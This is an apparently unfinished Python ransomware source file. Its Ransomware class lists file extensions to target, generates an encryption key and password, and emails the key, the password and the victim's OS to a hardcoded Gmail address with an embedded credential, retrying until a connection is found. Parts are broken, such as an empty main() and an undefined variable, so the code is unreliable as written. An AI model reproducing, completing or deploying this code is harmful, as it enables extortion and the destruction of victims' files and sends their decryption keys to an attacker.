import platform
import sys
import os
import fnmatch
import time
from tkinter import *
from tkinter import messagebox
from functools import partial
from PIL import ImageTk, Image
from threading import Thread
import subprocess

import modules.cryptography
import modules.send_email


class Ransomware:
    def __init__(self, starting_dir_test):
        # self.interesting_extensions = [
        #     'dwg', 'dxf', 'rtd', 'rft', 'rte', 'rvg', 'ies', 'rfa', 'rds'
        #                                                             'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd',
        #     'raw',
        #     'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',
        #     'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',
        #     'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
        #     'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 'mobi',
        #     'yml', 'yaml', 'json', 'xml', 'csv',
        #     'db', 'sql', 'dbf', 'mdb', 'iso',
        #     'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',
        #     'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',
        #     'java', 'class', 'jar',
        #     'ps', 'bat', 'vb',
        #     'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',
        #     'go', 'py', 'pyc', 'bf', 'coffee',
        #     'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',
        # ]

        self.interesting_extensions_tests = ['txt']
        self.starting_dir_test = starting_dir_test

    def main(self):
        start = time.time()


        stop = time.time()
        print('Encryption made in {}'.format(round(stop - start, 3)))


    def gen_pass(self):
        new_password = modules.cryptography.generate_password()
        return new_password


    def handle_key(self):
        key = modules.cryptography.generate_key(passwd)
        bin_key = ''

        for c in key:
            bin_key += str(c) + '.'

        return {
                "key": key,
                "bin_key": bin_key[:-1]
                }

    def handle_mail(self, key, passwd):

        main_dir = os.path.expanduser('~')
        is_connection = modules.check_connection.check_connection()
        bin_key = key['bin_key']

        self.create_copy_of_key(key, main_dir)

        while not is_connection:
            time.sleep(10)

            is_connection = modules.check_connection.check_connection()

        try:
            message_body = "OS: {}\nKey_dec: {}\nPassword: {}\nHashing_algorithm(password): SHA256\nEncryption_algorithm: AES".format(platform.system(), bin_key, passwd)
            modules.send_email.send_mail('transfered.data@gmail.com', '__47ck3r__', message_body, 'Ransomware report')

            self.remove_copy_of_key(main_dir)
        except:
            self.handle_mail(key, passwd)

if __name__ == '__main__':
    pass


